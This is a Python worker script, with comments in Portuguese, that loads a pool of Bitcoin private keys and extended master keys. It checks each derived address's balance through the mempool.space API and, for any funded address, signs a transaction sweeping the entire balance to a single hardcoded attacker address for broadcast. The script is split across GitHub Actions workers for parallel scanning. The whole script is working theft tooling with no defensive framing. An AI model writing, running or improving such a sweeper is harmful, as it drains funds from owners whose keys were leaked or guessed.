import os
import requests
import time
import sys
import re

# Tenta importar a biblioteca Bitcoinlib com tratamento de erro
try:
    from bitcoinlib.keys import Key
    from bitcoinlib.transactions import Transaction
    print("✅ Bibliotecas Bitcoinlib carregadas.", flush=True)
except ImportError:
    print("❌ ERRO: bitcoinlib não instalada. Verifique o passo de Deps no Workflow.", flush=True)
    sys.exit(1)

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = int(os.environ.get('TOTAL_WORKERS', 20))

def create_raw_tx(wif, balance_sats):
    """Cria e assina uma transação para transferir o saldo total para o destino."""
    try:
        k = Key(wif, network='bitcoin')
        # Taxa de mineração (sats). Agressiva para prioridade máxima.
        fee = 4000 
        amount = balance_sats - fee
        
        if amount <= 546: # Dust limit
            return None
            
        t = Transaction(network='bitcoin')
        t.add_input(k.address(), balance_sats)
        t.add_output(DEST_ADDRESS, amount)
        t.sign(k)
        return t.raw_hex()
    except Exception as e:
        print(f"❌ Erro ao assinar transação: {e}", flush=True)
        return None

def check_address(k, witness_type):
    """Verifica o saldo de um endereço específico e gera o HEX se houver saldo."""
    try:
        addr = k.address(witness_type=witness_type)
        # Log obrigatório para visibilidade no GitHub Actions
        print(f"🔎 W{WORKER_ID} | {addr}", flush=True)
        
        # Consulta à API do Mempool.space
        try:
            r = requests.get(f"https://mempool.space/api/address/{addr}", timeout=10)
            if r.status_code == 200:
                data = r.json()
                stats = data.get('chain_stats', {})
                mempool = data.get('mempool_stats', {})
                
                # Cálculo de saldo (Confirmado + Pendente)
                bal = (stats.get('funded_txo_sum', 0) + mempool.get('funded_txo_sum', 0)) - \
                      (stats.get('spent_txo_sum', 0) + mempool.get('spent_txo_sum', 0))
                
                if bal > 1000: # Verifica se há saldo significativo (> 1000 sats)
                    print(f"\n🚨 SALDO DETECTADO! {addr}: {bal} sats", flush=True)
                    raw_hex = create_raw_tx(k.wif(), bal)
                    if raw_hex:
                        # A tag HEX_GEN: é capturada pelo run_worker.sh para broadcast
                        print(f"HEX_GEN:{raw_hex}", flush=True)
                    return True
            elif r.status_code == 429:
                print("⚠️ Rate Limit atingido. Aguardando 10s...", flush=True)
                time.sleep(10)
        except Exception:
            pass # Ignora erros de conexão para manter o worker rodando
            
        # Delay suave para evitar bloqueio de IP (API pública)
        time.sleep(0.15)
    except:
        pass
    return False

def process_key(priv_key_str):
    """Processa uma string de chave, detectando se é WIF, HEX ou xprv (Deep Scan)."""
    priv_key_str = priv_key_str.strip()
    if not priv_key_str: return

    try:
        # --- LÓGICA DE DEEP SCAN (Master Keys xprv) ---
        if priv_key_str.startswith('xprv'):
            print(f"📦 W{WORKER_ID} | Iniciando Deep Scan em Master Key...", flush=True)
            master = Key(priv_key_str)
            # Varre os primeiros 50 endereços da derivação padrão
            for i in range(50):
                child_wif = master.subkey_for_path(f"0/{i}").wif()
                process_key(child_wif)
            return

        # --- VARREDURA DE CHAVES INDIVIDUAIS ---
        k = Key(priv_key_str, network='bitcoin')
        
        # Testa os 3 formatos de endereço para cada chave privada
        check_address(k, None)           # Legacy (1...)
        check_address(k, 'p2sh-p2wpkh')  # SegWit Compat (3...)
        check_address(k, 'p2wpkh')       # Native SegWit (bc1q...)
        
    except Exception:
        pass # Ignora chaves com formato inválido no arquivo

if __name__ == "__main__":
    print(f"--- INICIANDO WORKER {WORKER_ID} ---", flush=True)
    
    # Caminho do arquivo unificado gerado pelo prepare_pool.py
    pool_file = 'MASTER_POOL.txt'
    
    if os.path.exists(pool_file):
        with open(pool_file, 'r') as f:
            # Filtra linhas vazias
            all_keys = [line.strip() for line in f if line.strip()]
        
        # SHARDING: Divide a carga entre os 20 workers de forma exclusiva
        my_keys = [all_keys[i] for i in range(len(all_keys)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
        
        print(f"🚀 Worker {WORKER_ID} carregou {len(my_keys)} chaves únicas.", flush=True)
        
        for key in my_keys:
            process_key(key)
            
        print(f"✅ Worker {WORKER_ID} finalizou o lote.", flush=True)
    else:
        print(f"❌ ERRO: {pool_file} não encontrado!", flush=True)
